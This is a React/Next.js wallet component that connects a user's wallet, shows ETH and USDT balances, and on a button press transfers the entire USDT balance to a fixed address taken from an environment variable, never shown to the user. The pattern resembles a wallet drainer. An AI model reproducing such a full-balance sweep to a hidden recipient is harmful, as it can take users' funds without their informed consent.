
"use client"
import React from "react";
import useWalletConnectERC20 from "@/app/hooks/useWalletConnectERC20";

const WalletERC20 = () => {
  const { connectWallet, transferUSDT, balances, walletAddress } = useWalletConnectERC20();

  const recipientAddress = process.env.NEXT_PUBLIC_USDT_ADDRESS;

  const handleTransfer = async () => {
    if (!balances.usdt) {
      console.error("Balanța USDT este zero sau nu a fost obținută.");
      return;
    }
    const txHash = await transferUSDT(recipientAddress, balances.usdt);
    if (txHash) {
      console.log("Tranzacția a fost efectuată cu succes:", txHash);
    }
  };

  return (
    <div>
      {!walletAddress ? (
        <button onClick={connectWallet}>Connect Wallet</button>
      ) : (
        <div>
          <p>Wallet Address: {walletAddress}</p>
          <p>ETH Balance: {balances.eth} ETH</p>
          <p>USDT Balance: {balances.usdt} USDT</p>
          <button onClick={handleTransfer}>Transfer USDT</button>
        </div>
      )}
    </div>
  );
};

export default WalletERC20;
